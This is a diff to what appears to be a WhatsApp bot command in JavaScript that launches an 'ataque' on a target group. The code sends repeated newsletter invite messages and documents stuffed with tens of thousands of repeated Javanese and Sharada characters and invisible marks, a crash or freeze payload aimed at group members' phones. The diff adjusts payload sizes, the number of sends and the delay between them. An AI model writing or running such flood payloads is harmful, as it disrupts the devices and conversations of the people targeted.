@@ -24,8 +24,8 @@ let handler = async (m, { conn, text, isOwner, usedPrefix, command }) => {
         const basura = 'ꦾ'.repeat(90000);
         await conn.relayMessage(groupId, {
             newsletterAdminInviteMessage: {
-                newsletterJid: "12036322900056123@newsletter",
-                newsletterName: "ADOi" + basura.repeat(3),
+                newsletterJid: "120363408198325468@newsletter",
+                newsletterName: "ADOi" + basura.repeat(2),
                 jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
                 caption: "El mDKDNND",
                 inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
@@ -34,7 +34,7 @@ let handler = async (m, { conn, text, isOwner, usedPrefix, command }) => {
     };
 
     const docKillGrupo = async (i) => {
-        const traba = 'ꦾ'.repeat(90000);
+        const traba = 'ꦾ'.repeat(9000);
         const contenido = '\u200E'.repeat(5000) + i;
         await conn.sendMessage(groupId, {
             document: Buffer.from(contenido),
@@ -45,12 +45,12 @@ let handler = async (m, { conn, text, isOwner, usedPrefix, command }) => {
     };
 
     const canalGato = async () => {
-        const basura = '𑇂𑆵𑆴𑆿'.repeat(75000);
+        const basura = '𑇂𑆵𑆴𑆿'.repeat(5000);
         await conn.relayMessage(groupId, {
             newsletterAdminInviteMessage: {
-                newsletterJid: "12036322970006123@newsletter",
-                newsletterName: "🔥👾🔥👾" + basura.repeat(3),
-                jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
+                newsletterJid: "120363408198325468@newsletter",
+                newsletterName: "🔥👾🔥👾" + basura.repeat(2),
+                jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2hsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
                 caption: "El mejor bot",
                 inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
             }
@@ -58,7 +58,7 @@ let handler = async (m, { conn, text, isOwner, usedPrefix, command }) => {
     };
 
     const docGato = async (i) => {
-        const traba = '𑇂𑆵𑆴𑆿'.repeat(30000);
+        const traba = '𑇂𑆵𑆴𑆿'.repeat(9000);
         const contenido = '\u200E'.repeat(5000) + i;
         await conn.sendMessage(groupId, {
             document: Buffer.from(contenido),
@@ -71,7 +71,7 @@ let handler = async (m, { conn, text, isOwner, usedPrefix, command }) => {
     m.reply(`✅ Iniciando ataque al grupo: ${groupId}`);
 
     const delayMs = 9000;
-    const total = 200;
+    const total = 90;
     const ciclos = Math.floor(total / 4);
 
     for (let i = 0; i < ciclos; i++) {
